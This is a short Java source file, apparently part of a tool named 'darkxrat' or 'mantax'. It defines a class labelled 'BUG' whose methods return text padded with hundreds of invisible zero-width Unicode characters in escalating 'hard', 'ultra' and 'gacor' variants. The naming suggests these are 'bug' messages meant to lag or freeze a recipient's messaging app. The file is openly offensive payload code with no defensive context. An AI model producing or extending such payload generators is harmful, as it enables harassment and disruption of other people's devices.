package com.darkxrat.mantax.func.bug;

public class BuldoDelay {
    public static final String NAMA = "BULDO DELAY";
    public static final String TIPE = "BUG";

    public static String func() {
        return "\u2060".repeat(50) + "BULDO_DELAY" + "\u2060".repeat(50);
    }

    public static String funcHard() {
        return "\u2060".repeat(100) + "BULDO_DELAY_HARD" + "\u2060".repeat(100);
    }

    public static String funcUltra() {
        return "\u2060".repeat(200) + "BULDO_DELAY_ULTRA" + "\u2060".repeat(200);
    }

    public static String funcGacor() {
        return funcHard() + "\u200B" + funcUltra();
    }
}